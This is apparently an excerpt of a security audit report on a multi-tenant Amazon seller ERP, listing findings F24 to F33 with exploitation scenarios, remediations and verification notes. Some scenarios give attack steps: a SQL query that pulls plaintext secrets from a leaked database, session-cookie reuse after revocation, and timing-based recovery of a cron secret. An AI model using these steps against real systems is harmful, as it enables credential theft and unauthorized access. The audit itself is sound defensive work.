**Relevância Amazon DPP.** Bloqueador: colisao/sobrescrita cross-tenant de pedidos (que carregam PII) e de dados financeiros viola integridade e isolamento exigidos pela DPP. Reportar ao questionario que uniques ja sao por-seller e que ha teste cobrindo.

**Verificação adversarial.** The vulnerability is real and correctly described. Evidence from code:

1. src/lib/db.ts L249-261: The code explicitly documents the limitation. The comment states that while uniques are simple (single-column), "um 2º tenant poderia casar a linha de outro no upsert" and that migration to composite uniques "DEVEM virar compostos antes de onboard de empresa externa (Fase 1c)".

2. Schema confirms the affected simple uniques:
   - VendaAmazon @@unique([amazonOrderId, sku]) — prisma/schema.prisma L539
   - AmazonOrderRaw.amazonOrderId @unique — L572
   - InventorySnapshot @@unique([sku, dataSnapshot]) — L1261
   - AmazonSkuTrafficDaily @@unique([sku, data]) — L1392
   - AmazonFinanceTransaction.transactionId @unique — L1222
   - AmazonSettlementReport.reportId @unique / settlementId @unique — L1173/1175

3. injectUpsertEmpresaId (L263-283) intentionally leaves the `where` clause untouched. If two tenants share the same business key (e.g., same SKU literal in InventorySnapshot, or a transactionId collision), the upsert of tenant B will match and overwrite tenant A's row. The update branch…

---

### F24 · [MEDIUM] Worker, SQS consumer e crons processam toda a Amazon sob empresaId fixo 'mundofs'

- **Dimensão:** multi-tenant · **Categoria:** Broken Access Control / Multi-Tenant Isolation · **Confiança:** high
- **Severidade (auditor → verificador):** HIGH → MEDIUM · **Veredito:** CONFIRMED
- **Local:** `src/lib/tenant-context.ts:73-94`

**Descrição.** runWithWorkerTenant (tenant-context.ts L73-82) e currentEmpresaIdOrDefault (L92-94) fixam empresaId = process.env.WORKER_EMPRESA_ID || 'mundofs'. worker.ts (L82-89) envolve TODO o processamento de jobs nesse contexto unico; amazon-sqs-consumer.ts (L17-24) idem; cron-orders/finances/inventory/reviews (cron-*/route.ts) chamam runWithWorkerTenant. Ou seja, todo o pipeline de background (Orders/Finance/Inventory/Settlement/Refunds/Ads) roda como um unico tenant hardcoded. Pedidos com PII de qualquer conta Amazon sao gravados sob 'mundofs', independentemente de qual seller os possui. Os comentarios admitem 'single-tenant por ora ... vira per-AmazonAccount quando o worker iterar contas' — ou seja, ainda nao itera.

**Cenário de exploração.** Multi-tenant ativo: 1) Sellers A e B configuram suas contas. 2) Worker roda sob 'mundofs' e busca pedidos (a unica credencial global) gravando VendaAmazon/AmazonOrderRaw com empresaId='mundofs' (ou null). 3) Nem A nem B (empresaId=A/B no cookie) enxergam seus proprios pedidos pelo filtro enforce, OU se WORKER_EMPRESA_ID apontar para uma das empresas, os dados de ambos caem na empresa errada. Vazamento/atribuicao incorreta de PII de pedido sistemica.

**Remediação.** O worker deve iterar AmazonAccount ATIVA e, para cada uma, runWithTenant({empresaId: conta.empresaId, source:'worker'}) com as credenciais daquela conta. SQS deve rotear por sellerId/marketplaceId do payload para o empresaId correto. Eliminar o fallback fixo 'mundofs' em multi-tenant (fail-closed se a conta nao resolver empresa).

**Relevância Amazon DPP.** Bloqueador: o sync e exatamente o ponto onde PII de comprador entra no sistema. Atribuir/processar essa PII sob um tenant fixo errado quebra isolamento e least-privilege exigidos pela DPP.

**Verificação adversarial.** All code cited in the finding was read and verified:

1. `src/lib/tenant-context.ts` L73-82: `runWithWorkerTenant` hardcodes `empresaId = process.env.WORKER_EMPRESA_ID || "mundofs"` — confirmed at line 76.
2. `src/modules/amazon/worker.ts` L82-89: `processAmazonSyncJobs` wraps all job processing with `runWithTenant({ empresaId: WORKER_EMPRESA_ID, ... })` — confirmed at lines 85-88.
3. `scripts/amazon-sqs-consumer.ts` L17-24: SQS consumer uses the same fixed `SQS_EMPRESA_ID = process.env.WORKER_EMPRESA_ID || "mundofs"` — confirmed at line 17-22.
4. `src/app/api/amazon/cron-orders/route.ts` and `cron-finances/route.ts`: Both call `runWithWorkerTenant` — confirmed.

The architectural gap is real: in a multi-seller deployment, orders and all pipeline data (VendaAmazon, AmazonOrderRaw, AmazonFinanceTransaction, etc.) fetched by the worker would be stamped with a single fixed empresaId rather than the owning seller's empresaId. PII from orders (buyer name/address in AmazonOrderRaw) and financial data would be cross-attributed.

The codebase itself documents this limitation explicitly: "Sin…

---

### F25 · [MEDIUM] empresaId nullable (String?) sem FK/NOT NULL/default no banco — isolamento 100% dependente da app

- **Dimensão:** multi-tenant · **Categoria:** Security Misconfiguration / Data Integrity · **Confiança:** medium
- **Severidade (auditor → verificador):** MEDIUM → MEDIUM · **Veredito:** CONFIRMED
- **Local:** `prisma/schema.postgresql.prisma:490, 509, 538, 552, 557, 596`

**Descrição.** Praticamente todos os TENANT_MODELS declaram `empresaId String?` (nullable) sem foreign key para Empresa, sem NOT NULL e sem default — ex.: VendaAmazon (L490), AmazonFeeEstimate (L509-ctx), VendaCustoEventual (L538), AmazonOrderRaw (L552), ProdutoVariacao (L574), etc. (confirmado tambem no schema.prisma SQLite). O isolamento depende inteiramente de a extensao injetar empresaId em todo create/upsert. Qualquer escrita que escape do contexto (raw, script de manutencao, fallback 'mundofs', bug de cobertura) grava empresaId=null. Linhas com empresaId=null ficam ORFAS: nunca casam um filtro `where: { empresaId: 'X' }`, entao somem da UI de todos os tenants e nunca sao deletadas/auditadas. Sem FK tambem nao ha garantia de que o empresaId aponta para uma Empresa real.

**Cenário de exploração.** Nao e exploit direto de leitura cross-tenant (igualdade nao casa null), mas: 1) Um script de backfill roda sem runWithTenant -> grava milhares de VendaAmazon com empresaId=null. 2) Esses registros (com PII de comprador) ficam invisiveis a qualquer filtro de tenant e a rotinas de retencao/delecao escopadas por empresaId -> PII orfa persiste indefinidamente, violando a politica de retencao. 3) Inconsistencia silenciosa: relatorios financeiros do tenant ficam incompletos sem erro.

**Remediação.** Tornar empresaId NOT NULL com FK para Empresa (onDelete restrito/cascade conforme o caso) apos backfill, idealmente com DEFAULT a nivel de app (nunca DB). Adicionar job/check que alerta linhas com empresaId NULL. Garantir que rotinas de retencao de PII varram tambem empresaId IS NULL.

**Relevância Amazon DPP.** Relevante para retencao/delecao de PII exigida pela DPP: linhas orfas (empresaId null) com PII de pedido escapam das rotinas de delecao escopadas por empresa e persistem alem dos 30 dias pos-entrega. Tambem enfraquece a garantia de isolamento que o questionario cobra.

**Verificação adversarial.** The finding is technically accurate but the auditor overstated the exploitability and severity, conflating a data-integrity concern with an active security vulnerability. Here is what the code actually shows:

**What is confirmed:**

1. `empresaId String?` (nullable, no FK, no NOT NULL) is present across all listed TENANT_MODELS in both `prisma/schema.postgresql.prisma` and `prisma/schema.prisma`. The migration `20260529190000_multi_tenant_fase1/migration.sql` explicitly added `empresaId TEXT` (nullable, no FK) to every tenant table via `ADD COLUMN "empresaId" TEXT`.

2. No migration has ever added `NOT NULL` or a FK constraint to any of these TENANT_MODELS' `empresaId` columns (only `Usuario.empresaId` was promoted to NOT NULL in `20260601000000_multiempresa_onboarding/migration.sql`). So for models like `VendaAmazon`, `AmazonOrderRaw`, `AmazonReembolso`, etc., the database itself permits `empresaId = NULL`.

3. The isolation layer (`src/lib/db.ts`) operates entirely in application code and is gated by `TENANT_ISOLATION=enforce`. It is a NO-OP by design when the flag is absent or se…

---

### F26 · [MEDIUM] GET de config do Amazon Ads vaza comprimento e ultimos 4 caracteres do client_secret/refresh_token OAuth

- **Dimensão:** secrets-crypto · **Categoria:** Sensitive Data Exposure · **Confiança:** high
- **Severidade (auditor → verificador):** MEDIUM → MEDIUM · **Veredito:** CONFIRMED
- **Local:** `src/app/api/amazon/ads/config/route.ts:19-23`

**Descrição.** Diferente da rota de config da SP-API (src/app/api/amazon/config/route.ts:17-29) que usa mascara FIXA '••••••••' com comentario explicito 'NUNCA expor sufixo dos segredos — valor mascarado fixo sem comprimento real', a rota GET de config do Amazon Ads aplica a mascara `val.length > 8 ? '*'.repeat(val.length-4) + val.slice(-4) : '****'`. Isso revela na resposta JSON (a) o comprimento EXATO do amazon_ads_client_secret e do amazon_ads_refresh_token e (b) os ultimos 4 caracteres em texto puro. O mesmo padrao de exposicao parcial existe implicitamente onde esses segredos sao consumidos. A rota e protegida pela RBAC de path no proxy (/api/amazon esta em ADMIN_PATH_PREFIXES, proxy.ts:48-49,214-215), portanto exige ADMIN — mas qualquer ADMIN (ou um XSS/CSRF que rode no contexto de um ADMIN logado, ou um log de trafego/proxy) obtem comprimento + tail dos segredos OAuth. Para segredos de baixa-media entropia o tail+comprimento reduz o espaco de busca; mesmo para tokens de alta entropia, expor qualquer parte de um refresh_token OAuth contraria o padrao de zero-exposicao adotado no resto do sistema.

**Cenário de exploração.** 1) Um operador com papel ADMIN (ou um atacante que sequestrou uma sessao ADMIN via XSS/cookie theft) faz GET /api/amazon/ads/config. 2) A resposta retorna ex.: amazon_ads_refresh_token = '****************************Atzr' revelando os 4 ultimos chars e o tamanho total. 3) Combinado com o client_secret (mesmo vazamento), o atacante reduz o esforco de adivinhacao/validacao ou correlaciona o segredo entre ambientes (staging/prod) onde o tail seja igual. Para chaves curtas o vazamento e diretamente util. Mesmo sem quebra completa, e disseminacao desnecessaria de material de credencial OAuth para a borda/rede/logs.

**Remediação.** Padronizar com a rota SP-API: retornar mascara fixa de comprimento constante (ex.: '••••••••') para qualquer chave que case isSecretConfigKey, sem expor comprimento nem sufixo. Aplicar nas rotas src/app/api/amazon/ads/config/route.ts e src/app/api/amazon/ads/profiles/route.ts. Idealmente extrair um helper unico maskSecretsForResponse() reutilizado por todas as rotas de config para evitar divergencia.

**Relevância Amazon DPP.** ALTA relevancia. A Amazon DPP exige armazenamento e manuseio seguros de credenciais OAuth (refresh tokens) com least-privilege e nao-exposicao. O questionario de seguranca pergunta explicitamente como segredos sao mascarados em UIs/APIs. Vazar comprimento + tail de um refresh_token OAuth do Ads e exatamente o tipo de exposicao parcial que um avaliador da DPP aponta; corrigir alinha com a postura ja correta da rota SP-API.

**Verificação adversarial.** The vulnerability is real and confirmed by direct code reading.

**Evidence in src/app/api/amazon/ads/config/route.ts lines 14-28:**

The GET handler uses `handle()` (bare error-wrapper, no auth) and never calls `requireRole` or `requireSession` internally. The masking logic at lines 19-23 is exactly as described:

```typescript
safe[key] =
  val.length > 8
    ? `${"*".repeat(val.length - 4)}${val.slice(-4)}`
    : "****";
```

This leaks (a) the exact character length of `amazon_ads_client_secret` and `amazon_ads_refresh_token`, and (b) the last 4 characters in plaintext — for every key whose name includes "secret" or "token".

**Contrast with SP-API config (src/app/api/amazon/config/route.ts lines 15-29):**
- Calls `requireRole(ADMIN)` explicitly inside the handler (defense-in-depth, not proxy-only).
- Uses fixed-length mask `"••••••••"` with an explicit comment "NUNCA expor sufixo dos segredos — valor mascarado fixo sem comprimento real".

The auditor's claim about ADMIN-only access via proxy is confirmed: `ADMIN_PATH_PREFIXES` at proxy.ts:45-53 includes `/api/amazon`, and `canAc…

---

### F27 · [MEDIUM] Segredos legados em texto puro permanecem em claro no banco — sem migracao de cifragem em repouso

- **Dimensão:** secrets-crypto · **Categoria:** Cryptographic Failures · **Confiança:** medium
- **Severidade (auditor → verificador):** MEDIUM → MEDIUM · **Veredito:** CONFIRMED
- **Local:** `src/lib/crypto.ts:69-93`

**Descrição.** decryptConfigValue() faz passthrough de qualquer valor que NAO comece com o prefixo 'enc:v1:' (linha 71: `if (!isEncrypted(stored)) return stored;`). Isso e intencional para retrocompatibilidade ('compatibilidade com valores legados em texto puro' — confirmado tambem no CLAUDE.md: 'Legado em texto puro ainda lido'). O problema: nao existe nenhuma migration Prisma nem script de backfill que re-cifre os valores legados (busca em prisma/migrations por encrypt/crypto/cipher = 0; busca em scripts/ por encrypt/rotate/migrate-secret = 0). Consequencia: qualquer segredo (amazon_refresh_token, amazon_client_secret, smtp, waha_api_key, gmail_refresh_token) que tenha sido gravado ANTES da introducao da cifragem, ou em qualquer janela em que CONFIG_ENCRYPTION_KEY esteve ausente, permanece indefinidamente em TEXTO PURO na coluna ConfiguracaoSistema.valor (schema.postgresql.prisma:830-836, valor String) ate ser reescrito manualmente pela UI. Um dump do banco (backup, replica, acesso DBA, SQL injection em outra rota) expoe esses segredos diretamente.

**Cenário de exploração.** 1) Em algum momento (rollout inicial, ou deploy sem CONFIG_ENCRYPTION_KEY setada) o amazon_refresh_token foi salvo em texto puro. 2) A app continua funcionando porque getAmazonConfig()/decryptConfigValue le o valor cru sem erro. 3) Como nada re-cifra automaticamente, o refresh_token OAuth da Amazon fica em claro na tabela. 4) Um atacante com acesso de leitura ao Postgres (backup vazado, snapshot, credencial DBA, ou outra vuln de leitura de DB) faz `SELECT chave, valor FROM "ConfiguracaoSistema" WHERE valor NOT LIKE 'enc:%'` e exfiltra todos os segredos legados em texto puro, incluindo o refresh_token que da acesso total a conta Amazon do seller.

**Remediação.** Criar um script de backfill idempotente (ex.: scripts/encrypt-legacy-config.ts) que percorra ConfiguracaoSistema, e para toda chave com isSecretConfigKey(chave)===true cujo valor NAO comeca com 'enc:', re-grave encryptConfigValue(valor). Rodar em prod apos garantir CONFIG_ENCRYPTION_KEY. Adicionar verificacao de saude/alerta (Notificacao CONFIG_REVIEW) quando existir alguma chave secreta sem prefixo enc:. Documentar em docs/secrets-rotation.md.

**Relevância Amazon DPP.** ALTA relevancia / potencial bloqueador. A DPP exige criptografia em repouso de credenciais OAuth e segredos (refresh tokens, client secrets). Um avaliador que pedir prova de cifragem em repouso e encontrar linhas de segredo em texto puro no banco reprova o questionario. Embora a app cifre NOVAS gravacoes, a ausencia de migracao de legado significa que segredos sensiveis podem persistir em claro — exatamente o que a DPP proibe.

**Verificação adversarial.** All evidence in the codebase supports the finding, with one minor nuance on severity.

WHAT IS CONFIRMED:
1. `src/lib/crypto.ts` L71: `decryptConfigValue` silently returns the stored value as-is when it lacks the `enc:v1:` prefix. This is explicit, intentional legacy-compatibility behavior.
2. No backfill script exists. Searching `scripts/` for `encrypt`, `rotate`, `migrate-secret`, `cipher` returns zero relevant hits. No migration SQL touches encryption of existing rows.
3. No startup or health-check probes `ConfiguracaoSistema` for unencrypted secret keys. The worker (`scripts/amazon-worker.ts` L8-14) only blocks startup when `CONFIG_ENCRYPTION_KEY` itself is absent — it does not scan for existing plaintext secrets already in the DB.
4. `saveAmazonConfig` (`src/modules/amazon/service.ts` L194) correctly calls `encryptConfigValue` on every write path, so any secret re-submitted through the UI will be encrypted. However, the re-submission is entirely manual and user-triggered; nothing in the system prompts or forces it.
5. The schema (`prisma/schema.postgresql.prisma` L830-836) store…

---

### F28 · [MEDIUM] encryptConfigValue grava segredo em texto puro silenciosamente fora de NODE_ENV=production quando a chave falta

- **Dimensão:** secrets-crypto · **Categoria:** Cryptographic Failures · **Confiança:** high
- **Severidade (auditor → verificador):** LOW → MEDIUM · **Veredito:** CONFIRMED
- **Local:** `src/lib/crypto.ts:50-63`

**Descrição.** encryptConfigValue() chama getKey(); se a chave master CONFIG_ENCRYPTION_KEY estiver ausente, getKey() retorna null e a funcao executa requireEncryptionKeyForSecret() (linhas 38-44) que SO lanca quando process.env.NODE_ENV === 'production'. Em qualquer outro NODE_ENV (incluindo um ambiente de staging/homologacao que NAO seja explicitamente 'production', ou um deploy mal configurado), a funcao RETORNA O TEXTO PURO (linha 54) e o chamador (saveAmazonConfig / ads-service / whatsapp-estoque config) grava o segredo em claro no banco SEM erro nem aviso. Combinado com o achado de legado (sem backfill), isso cria uma janela silenciosa de cleartext: o operador acredita que o segredo foi cifrado, mas nao foi.

**Cenário de exploração.** 1) Time sobe um ambiente de staging atras de TLS mas esquece de setar NODE_ENV=production (cenario plausivel: CLAUDE.md menciona COOKIE_SECURE para staging justamente porque NODE_ENV nem sempre e production fora de prod). 2) CONFIG_ENCRYPTION_KEY tambem nao foi setada nesse ambiente. 3) Um ADMIN configura as credenciais Amazon pela UI. 4) saveAmazonConfig grava amazon_refresh_token e amazon_client_secret em TEXTO PURO sem qualquer erro. 5) Esse banco de staging (frequentemente com credenciais reais para testes) vaza os segredos em claro.

**Remediação.** Falhar de forma estrita sempre que houver tentativa de cifrar um segredo sem chave, independentemente de NODE_ENV (ou gatear por uma flag explicita ALLOW_PLAINTEXT_SECRETS apenas para dev local). No minimo, emitir logger.warn (sem o valor) quando cair no caminho de texto puro, e expor um indicador de saude. Considerar exigir CONFIG_ENCRYPTION_KEY tambem em staging via COOKIE_SECURE-like override.

**Relevância Amazon DPP.** Media relevancia. Ambientes nao-prod que manuseiam credenciais OAuth reais ainda estao no escopo da DPP. Um caminho que silenciosamente desabilita a cifragem em repouso fora de prod e um risco que avaliadores levantam, pois staging frequentemente espelha dados/credenciais de producao.

**Verificação adversarial.** The vulnerability is real and confirmed by direct code reading.

**Evidence in src/lib/crypto.ts (lines 38-54):**
- `requireEncryptionKeyForSecret()` (lines 38-44) only throws when `process.env.NODE_ENV === "production"`. Outside that branch the function returns silently.
- `encryptConfigValue()` (lines 50-54): when `getKey()` returns null (no CONFIG_ENCRYPTION_KEY), calls `requireEncryptionKeyForSecret()` then immediately returns `plain` — the unencrypted secret — with no error, no log, no warning.

**All four callers write this plaintext directly to the database:**
- `src/modules/amazon/service.ts:194` (saveAmazonConfig — amazon_refresh_token, amazon_client_secret, amazon_client_id)
- `src/modules/amazon/ads-service.ts:76` (saveAmazonAdsConfig — Ads API credentials)
- `src/modules/whatsapp-estoque/config.ts:109` (saveWhatsappEstoqueConfig — WAHA API key)
- `src/lib/gmail.ts:24` (setCfg — Gmail OAuth tokens)

**Partial mitigation exists but only for the worker, not the web process:**
- `scripts/amazon-worker.ts:8-14`: exits with code 1 if `NODE_ENV=production` AND `CONFIG_ENCRYPTION…

---

### F29 · [LOW] Middleware autoriza navegação de páginas só com verifySession (sem checar ativo/sessionVersion)

- **Dimensão:** authn-session · **Categoria:** Broken Access Control · **Confiança:** medium
- **Severidade (auditor → verificador):** LOW → LOW · **Veredito:** CONFIRMED
- **Local:** `src/proxy.ts:277-294`

**Descrição.** No proxy (middleware), a decisão de permitir/redirecionar usa `verifySession(token)`, que valida apenas assinatura HMAC + exp — NÃO consulta o DB para checar `Usuario.ativo` nem `sessionVersion`. Para rotas /api/* isso é mitigado porque os handlers chamam requireSession/requireRole (getSession revalida no DB). Mas para navegação de PÁGINAS (server components), o middleware é o único gate antes do render: um usuário desativado (ativo=false) ou com sessão revogada (sessionVersion incrementado) continua passando pelo middleware e carregando o shell/markup da página até o cookie expirar. O RBAC por path (canAccessPath) também confia no `role` que está dentro do cookie assinado — se o role do usuário for rebaixado no DB, o cookie antigo ainda carrega o role elevado para fins de navegação até reemissão/expiração.

**Cenário de exploração.** 1. Admin desativa o usuário U (ativo=false) por suspeita de comprometimento. 2. U (ou quem tem o cookie de U) navega para /dashboard-ecommerce ou /financeiro; o middleware aceita (assinatura válida, exp no futuro) e renderiza a página. 3. Os fetches de dados via /api/* eventualmente retornam 401 (porque os handlers revalidam no DB), mas o usuário revogado ainda vê a estrutura/menus e qualquer dado embutido em server component que não passe por getSession.

**Remediação.** Aceitar que o middleware Edge não consulta o DB facilmente, mas garantir que TODA página sensível (server component/layout) chame getSession/requireSession (revalidação no DB) antes de renderizar dados — não confiar no role/estado do cookie para autorização de conteúdo. Considerar reduzir o maxAge de 'remember-me' (30d) e/ou mover a verificação de ativo/sessionVersion para um layout server-side compartilhado das áreas autenticadas.

**Relevância Amazon DPP.** MÉDIO. Least-privilege e revogação imediata de acesso são exigências da DPP. Mostrar que o desligamento de um usuário (offboarding) tem efeito imediato sobre o acesso a páginas que exibem PII é parte do que a Amazon avalia; um lag de até 30 dias para páginas é uma observação relevante.

**Verificação adversarial.** The finding is accurate but requires severity calibration based on what is actually exposed.

Evidence from the code:

1. `src/proxy.ts` lines 277-278: `const session = await verifySession(token)` — `verifySession` (from `src/lib/session.ts`) performs only HMAC-SHA256 signature verification + expiry check. No DB lookup for `ativo` or `sessionVersion`.

2. `src/lib/auth.ts` lines 33-38: `getSession()` DOES perform the full DB revalidation (`user.ativo`, `sessionVersion` comparison), but this function is only called by API route handlers (`requireSession`/`requireRole`) and the handful of server components that explicitly import it.

3. No `layout.tsx` in the authenticated area calls `getSession`. The root layout (`src/app/layout.tsx`) renders `AppShell` which is a `"use client"` component — no server-side auth gate.

4. The majority of app pages (`dashboard-ecommerce/page.tsx`, `caixa/page.tsx`, `vendas/page.tsx`, `configuracoes/page.tsx`, `financeiro/dashboard/page.tsx`, and 16+ others) are all `"use client"` pages — they cannot call `getSession` server-side and do not do so.

5. The…

---

### F30 · [LOW] Habilitar 2FA-por-email não verifica posse do email nem confirma com código

- **Dimensão:** authn-session · **Categoria:** Identification and Authentication Failures · **Confiança:** high
- **Severidade (auditor → verificador):** LOW → LOW · **Veredito:** CONFIRMED
- **Local:** `src/app/api/perfil/2fa/route.ts:34-45`

**Descrição.** O endpoint POST /api/perfil/2fa simplesmente seta `twoFactorEnabled` e `twoFactorMethod='EMAIL'` no usuário, sem exigir reautenticação de senha nem confirmar um código de teste enviado ao email. Como o segundo fator é o próprio email da conta (Usuario.email), o 2FA aqui é, na prática, um 'segundo fator' atrelado à mesma posse de email que o reset de senha — não há prova independente de posse de um dispositivo/app TOTP. Combinado com o fato de que o método é forçado a EMAIL sem opção/validação, o ganho de segurança real é limitado e pode dar falsa sensação de proteção forte.

**Cenário de exploração.** 1. Atacante com sessão ativa da vítima (ex: cookie roubado, dispositivo desbloqueado) habilita 2FA sem precisar reconfirmar a senha. 2. Como o 2FA usa o mesmo email, não eleva a barreira contra quem já controla o inbox da vítima; e a UI passa a indicar '2FA ativo', mascarando o real nível de proteção. Não é um bypass direto de auth, mas é um controle de 2FA fraco para fins de avaliação.

**Remediação.** Exigir reautenticação de senha para ativar/desativar 2FA; enviar um código de confirmação ao email e só ativar após o usuário inserir o código (prova de posse). Idealmente oferecer TOTP (RFC 6238) como segundo fator real, independente do canal de email/reset.

**Relevância Amazon DPP.** MÉDIO. A DPP valoriza MFA robusto para acesso a dados protegidos. Um 2FA cujo segundo fator é o mesmo email do reset, ativável sem reautenticação, é um controle fraco que pode ser apontado no questionário; oferecer TOTP fortaleceria a postura para a aprovação.

**Verificação adversarial.** O arquivo `src/app/api/perfil/2fa/route.ts` foi lido diretamente. O handler POST em linhas 34-45 confirma que a ativação/desativação do 2FA exige apenas uma sessão válida via `requireSession()` e atualiza `twoFactorEnabled`/`twoFactorMethod` imediatamente, sem exigir reautenticação de senha nem enviar um código de confirmação ao email do usuário.

O cenário de exploração parcial é real: qualquer sessão ativa (ex: cookie roubado, dispositivo desbloqueado) pode silenciosamente desativar o 2FA sem que o dono da conta saiba, reduzindo a postura de segurança; ou pode ativá-lo causando interferência no próximo login legítimo.

Porém, o auditor superestima o impacto: a leitura completa do fluxo de login (`src/app/api/auth/login/route.ts` + `src/app/api/auth/2fa/verificar/route.ts`) mostra que o mecanismo de 2FA em si é corretamente implementado — código de 6 dígitos cryptograficamente aleatório (`crypto.randomInt`), bcrypt-hashed, TTL de 5 minutos, invalidado após uso, com brute-force protection (máx 5 tentativas por challenge com invalidação automática). Não há bypass do 2FA no momento do …

---

### F31 · [LOW] Endpoint publico /api/health vaza mensagem crua de erro do banco em 503

- **Dimensão:** config-deps · **Categoria:** Security Misconfiguration / Information Disclosure · **Confiança:** high
- **Severidade (auditor → verificador):** LOW → LOW · **Veredito:** CONFIRMED
- **Local:** `src/app/api/health/route.ts:32-50`

**Descrição.** GET /api/health esta em PUBLIC_PATHS (src/proxy.ts L24) e NAO exige sessao. Quando o $queryRaw `SELECT 1` falha, o handler retorna NextResponse.json({ ok:false, db:{ ok:false, error: e instanceof Error ? e.message : String(e) }, ... }, { status: 503 }) ANTES de qualquer checagem de auth (a checagem internalTokenOk/ADMIN so acontece depois, no caminho de sucesso). A mensagem de erro do Prisma/driver Postgres frequentemente embute host, porta, nome do banco e usuario (ex: 'Can't reach database server at `127.0.0.1`:`5432`' ou 'database "erp_amazon" does not exist'), revelando topologia interna a qualquer cliente nao autenticado. O resto do payload (worker/quota/queue/lastSync) ja esta corretamente protegido atras de sessao ADMIN ou X-Internal-Health-Token (timingSafeEqual) — apenas o ramo de falha de DB escapa.

**Cenário de exploração.** 1. Atacante anonimo (ou scanner) faz GET https://erp.mundofs.cloud/api/health durante uma janela de instabilidade do Postgres (deploy, restart, falha de rede). 2. Recebe 503 com { db: { error: 'Can't reach database server at 127.0.0.1:5432' } } ou erro de autenticacao do Postgres contendo usuario/role. 3. Aprende host/porta/usuario/nome do banco internos, util para enumeracao e para correlacionar com outros vetores.

**Remediação.** No ramo !dbCheck.ok, devolver apenas { ok:false, version, elapsedMs } SEM o campo db.error (ou substituir por um codigo generico tipo 'DB_UNREACHABLE'). Manter a mensagem detalhada somente no log server-side (logger.error). Aplicar o mesmo princE9pio para clientes sem token interno/sessao ADMIN, igual ao restante do endpoint.

**Relevância Amazon DPP.** MEDIA. O questionario de seguranca / DPP da Amazon avalia minimizacao de divulgacao de informacao e exposicao de detalhes de infraestrutura. Vazar topologia de DB em endpoint publico nao expoe PII de comprador diretamente, mas e exatamente o tipo de 'verbose error/information leakage' que a revisao penaliza. Corrigir fortalece a postura sem custo funcional.

**Verificação adversarial.** The vulnerability is real and exploitable exactly as described. The evidence from reading the actual code:

1. src/app/api/health/route.ts lines 32-37: db.$queryRaw catches the Prisma/driver error and stores the raw e.message in dbCheck.error with no sanitization.

2. Lines 40-50: The early-return branch on !dbCheck.ok serializes the full dbCheck object (including the raw error string) into the 503 JSON response and returns immediately — before any auth check is evaluated.

3. src/proxy.ts line 24: /api/health is in PUBLIC_PATHS, so the middleware calls NextResponse.next() without any session or token check. Any unauthenticated client reaches the route handler.

4. The auth gate (internalTokenOk || session?.role === 'ADMIN') at lines 106-118 is only evaluated after the early return on line 41-50. The DB failure path entirely bypasses this gate.

5. src/lib/db.ts uses a plain PrismaClient with no custom error serialization. Postgres driver errors (via the pg package or Prisma runtime) commonly embed host, port, database name, and role/user in the message string (e.g., "Can't reach dat…

---

### F32 · [LOW] CSP de producao permite 'unsafe-inline' em script-src (e 'unsafe-eval' em dev)

- **Dimensão:** config-deps · **Categoria:** Security Misconfiguration (CSP) · **Confiança:** high
- **Severidade (auditor → verificador):** LOW → LOW · **Veredito:** CONFIRMED
- **Local:** `src/proxy.ts:96-116`

**Descrição.** cspDirectives() emite, em producao, `script-src 'self' 'unsafe-inline'`. 'unsafe-inline' em script-src anula grande parte da protecao da CSP contra XSS, pois permite execucao de qualquer <script> inline injetado. Ha mitigacao parcial via `script-src-attr 'none'` (corta handlers de atributo on*=), mas scripts inline de corpo continuam liberados. Em dev ainda adiciona 'unsafe-eval'. O comentario no codigo justifica como necessario para os scripts de hidratacao do Next, porem isso e contornavel com nonce/hash por request.

**Cenário de exploração.** Caso exista (agora ou futuramente) qualquer sink de XSS refletido/armazenado numa rota autenticada (ex: render de campo controlado pelo usuario sem escape), a CSP NAO bloquearia o payload inline — diferentemente de uma CSP baseada em nonce/strict-dynamic. A CSP atual portanto nao serve de segunda barreira efetiva contra XSS de script inline.

**Remediação.** Migrar para CSP baseada em nonce: gerar um nonce por request no proxy/middleware, propaga-lo aos scripts do Next (next suporta nonce em App Router) e usar `script-src 'self' 'nonce-<n>' 'strict-dynamic'`, removendo 'unsafe-inline'. Em dev manter 'unsafe-eval' apenas se o HMR exigir, mas nunca em prod.

**Relevância Amazon DPP.** BAIXA-MEDIA. A DPP nao exige CSP estrita explicitamente, mas o questionario de seguranca da Amazon pontua defesas contra XSS/clickjacking. Uma CSP com 'unsafe-inline' enfraquece a resposta de 'defense-in-depth contra XSS' — relevante porque a app exibira PII de pedidos de sellers terceiros.

**Verificação adversarial.** The finding is technically accurate and fully confirmed by direct reading of `src/proxy.ts` lines 96-116. In production, `cspDirectives()` emits `script-src 'self' 'unsafe-inline'` (line 99), which neutralises CSP as a second-layer defence against inline-script XSS. In dev, `'unsafe-eval'` is also added (line 100). The partial mitigation `script-src-attr 'none'` (line 105) only blocks attribute-form event handler injection (`onclick=`, `onmouseover=`, etc.) — it does NOT restrict `<script>` tag bodies. No nonce is generated anywhere in the middleware or in `next.config.mjs`; grep for `nonce`, `generateNonce`, and `crypto.randomUUID` in a middleware context returned zero results.

Two factors prevent escalation to MEDIUM/HIGH: (1) No confirmed XSS sink exists in the current codebase — `dangerouslySetInnerHTML`/`__html` patterns are absent from all `.tsx` components; (2) React JSX escapes text content by default, so CSP misconfiguration alone cannot be independently exploited. The weakness is a failure of defence-in-depth: if a future XSS sink is introduced, the CSP will provide no blo…

---

### F33 · [LOW] CRON_SECRET comparado com igualdade de string (nao constante no tempo) e fail-open em nao-producao

- **Dimensão:** config-deps · **Categoria:** Broken Authentication / Timing Side-Channel · **Confiança:** medium
- **Severidade (auditor → verificador):** LOW → LOW · **Veredito:** CONFIRMED
- **Local:** `src/lib/cron-auth.ts:3-16`

**Descrição.** verifyCronRequest compara o header Authorization com `header === \`Bearer ${secret}\``. A comparacao com === de string em JS faz short-circuit no primeiro byte divergente, abrindo um canal lateral de tempo teorico para recuperar o CRON_SECRET byte a byte. Diferente do /api/health (que usa timingSafeEqual), aqui nao ha protecao. Os endpoints protegidos por esse helper (/api/amazon/cron-orders, cron-inventory, cron-finances, reviews/cron-daily, /api/amazon/worker) sao PUBLICOS no proxy (src/proxy.ts L25-29) e disparam jobs de sincronizacao Amazon. Adicionalmente, quando NODE_ENV != production e CRON_SECRET ausente, retorna { ok: true } (fail-open) — aceitavel em dev, mas perigoso se a app rodar em staging sem NODE_ENV=production.

**Cenário de exploração.** 1. Cenario timing: atacante remoto mede latencia de resposta de /api/amazon/worker variando o Bearer token para inferir bytes do segredo (explorabilidade pratica baixa em rede com jitter, mas e uma fraqueza real e gratuita de corrigir). 2. Cenario fail-open: se o ambiente de staging subir sem NODE_ENV=production e sem CRON_SECRET definido, qualquer um pode acionar /api/amazon/worker e os crons, disparando jobs de sync/consumo de quota SP-API sem autenticacao.

